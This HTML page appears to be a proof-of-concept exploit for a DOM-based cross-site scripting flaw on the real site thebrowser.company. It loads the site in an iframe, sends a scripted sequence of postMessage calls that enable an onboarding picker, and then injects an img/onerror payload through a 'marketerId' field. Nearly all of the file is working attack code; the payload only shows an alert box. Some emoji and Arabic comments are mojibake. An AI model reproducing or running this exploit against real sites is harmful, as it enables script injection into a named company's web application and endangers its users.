<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ðŸ”¥ DOM XSS Exploit - thebrowser.company</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    iframe { width: 100%; height: 600px; border: 2px solid #0f0; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>âœ… DOM XSS Exploit via postMessage</h1>
  <iframe id="target" src="https://thebrowser.company" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>

  <script>
    const iframe = document.getElementById("target");
    const payload = `<img src=x onerror="alert('ðŸ”¥ DOM XSS Confirmed')">`;

    const messages = [
      {
        label: "Reset dismissed",
        msg: {
          message: "OB_RESET_DISMISSED",
          content: { dismissed: false }
        }
      },
      {
        label: "Reset completed",
        msg: {
          message: "OB_RESET_ONBOARDING",
          content: { completed: false }
        }
      },
      {
        label: "Enable onboarding",
        msg: {
          message: "OB_ENABLE_ALL",
          content: {
            __ONBOARDING_ALLOWED__: true,
            OB_SESSION_STARTED: true,
            OB_ONBOARDING_SESSION: true
          }
        }
      },
      {
        label: "Show picker",
        msg: { message: "OB_SHOW_PICKER" }
      },
      {
        label: "Should show picker",
        msg: {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: [payload]
          }
        }
      },
      {
        label: "Open picker",
        msg: {
          message: "OB_OPEN_PICKER",
          content: {
            marketerId: [payload]
          }
        }
      }
    ];

    iframe.onload = () => {
      console.log("âœ… iframe loaded");
      let delay = 0;
      messages.forEach(({ label, msg }, i) => {
        setTimeout(() => {
          console.log(`ðŸš€ Sending: ${label}`);
          iframe.contentWindow.postMessage(msg, "*");
        }, delay);
        delay += 1000; // ØªØ£Ø®ÙŠØ± 1 Ø«Ø§Ù†ÙŠØ© Ø¨ÙŠÙ† ÙƒÙ„ Ø±Ø³Ø§Ù„Ø©
      });
    };
  </script>
</body>
</html>
